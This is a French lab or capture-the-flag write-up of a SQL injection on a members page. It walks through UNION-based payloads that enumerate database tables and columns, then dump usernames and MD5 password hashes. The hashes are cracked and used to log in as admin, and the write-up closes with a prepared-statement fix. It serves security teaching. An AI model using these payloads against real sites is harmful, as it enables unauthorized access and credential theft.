# Vulnérabilité

Sur la page membres, cette injection SQL basique nous permet de lister les tables SQL exsitantes:

`1=1 UNION SELECT table_name, table_schema FROM information_schema.tables;`

On trouve alors une table nommée `db_default` avec un schéma `Member_Brute_Force`.

Ensuite on peut lister les colonnes de toutes les tables avec cette injection SQL:

`1=1 UNION SELECT table_name, column_name FROM information_schema.columns;`

On identifie alors 3 colonnes: `username`, `password` et `id`.

Maintenant que nous avons toutes ces informations nous pouvons faire une requête SQL via injection pour récupérer toutes les informations que nous souhaitons sur la table.

`1=1 UNION SELECT username, password FROM Member_Brute_Force.db_default`

On identifie alors deux utilisateurs:

`root:3bf1114a986ba87ed28fc1b5884fc2f8`
`admin:3bf1114a986ba87ed28fc1b5884fc2f8`

Rapidement, on s'aperçoit que les mots de passes sont des hash MD5.

On peut utiliser un outil tel que https://md5decrypt.net/ pour décrypter le hash et on retrouve alors le mot de passe d'origine `shadow`.

Enfin sur la page `http://192.168.X.X/?page=signin` on peut se connecter sur les comptes trouvés comme par exemple `admin:shadow`.

# Solution

Pour se protéger de la faille, il faut utiliser des requêtes préparées.

__Exemple en PHP:__

```
// Avec PDO (https://www.php.net/manual/fr/pdo.prepare.php)

$stmt = $pdo->prepare('SELECT * FROM salaries WHERE prenom = :prenom');
$stmt->execute(array('prenom' => $prenom));

foreach ($stmt as $ligne) {
	// Traitement de la ligne de résultat
}
```

Le mot de passe pourrait également être trouvé facilement avec une wordlist via Brute Force, il est recommandé d'utiliser des mots de passes plus complexes et qui ne font pas références à des mots existants.